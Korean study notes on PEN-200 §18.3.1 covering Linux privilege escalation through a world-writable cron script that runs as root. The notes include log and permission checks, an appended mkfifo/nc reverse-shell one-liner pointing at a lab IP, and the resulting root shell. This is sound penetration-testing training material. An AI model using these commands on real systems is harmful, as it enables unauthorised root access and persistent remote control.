---
tags:
  - type/theory
  - platform/pen200
type: theory
platform: pen200
source: pen-200.pdf
section: "18.3.1"
---

# 18.3.1 cron 작업 악용

> **Abusing Cron Jobs** · PEN-200 §18.3.1

전제 — 비권한 사용자로 이미 셸을 잡은 상태. 취약한 파일 권한을 악용하려면 **① 우리가 쓰기 가능하고 ② 상위 권한으로 실행되는** 파일을 찾아야 함. 두 조건을 동시에 만족하기 쉬운 표적이 cron 임 — 시스템 수준 예약 작업은 root 권한으로 돌고, 관리자가 만든 스크립트의 권한 설정이 느슨한 경우가 많음.

파일시스템의 crontab 위치를 뒤지는 것 외에 **로그로 확인하는 방법**도 있음. 실행될 때마다 남으므로 실행 주기와 실행 사용자를 같이 얻음.

```
joe@debian-privesc:~$ grep "CRON" /var/log/syslog
...
Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (pidfile fd = 3)
Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (Running @reboot jobs)
Aug 25 04:57:01 debian-privesc CRON[918]:  (root) CMD (/bin/bash
/home/joe/.scripts/user_backups.sh)
Aug 25 04:58:01 debian-privesc CRON[1043]: (root) CMD (/bin/bash
/home/joe/.scripts/user_backups.sh)
Aug 25 04:59:01 debian-privesc CRON[1223]: (root) CMD (/bin/bash
/home/joe/.scripts/user_backups.sh)
```

`(root)` 로 실행되고 타임스탬프 간격이 1분임을 읽어냄. 경로를 알았으니 내용과 권한을 확인함.

```
joe@debian-privesc:~$ cat /home/joe/.scripts/user_backups.sh
#!/bin/bash
cp -rf /home/joe/ /var/backups/joe/
joe@debian-privesc:~$ ls -lah /home/joe/.scripts/user_backups.sh
-rwxrwxrw- 1 root root 49 Aug 25 05:12 /home/joe/.scripts/user_backups.sh
```

소유자는 root 인데 **other 에 쓰기 권한(`rw-`)이 열려 있음** → 스크립트 내용을 우리가 바꿀 수 있고, 그 내용은 root 가 실행함. 리버스셸 한 줄을 덧붙이면 최대 1분 안에 root 셸이 돌아옴. 덮어쓰지 말고 `>>` 로 **추가**할 것 — 교재 예시도 원래 `cp` 백업 줄을 남긴 채 리버스셸 줄만 덧붙임.

```
joe@debian-privesc:~$ cd .scripts
joe@debian-privesc:~/.scripts$ echo >> user_backups.sh
joe@debian-privesc:~/.scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i
2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
joe@debian-privesc:~/.scripts$ cat user_backups.sh
#!/bin/bash
cp -rf /home/joe/ /var/backups/joe/
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f
```

> ⚠️ **교재 오류** — `echo` 로 써 넣은 LHOST 는 `192.168.118.2` 인데 바로 뒤 `cat` 출력은 `10.11.0.4` 로 나옴. 교재가 옛 랩 주소를 남긴 불일치이므로 실제로는 자기 `tun0` 주소를 쓸 것.

공격 머신에 리스너를 띄우고 주기가 돌아오길 기다림.

```
kali@kali:~$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [192.168.118.2] from (UNKNOWN) [192.168.50.214] 57698
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

단순한 예지만 현장에서 드물지 않음 — 관리자가 시스템을 가동시키는 데 집중하느라 스크립트 파일 권한을 뒤로 미루기 때문임.
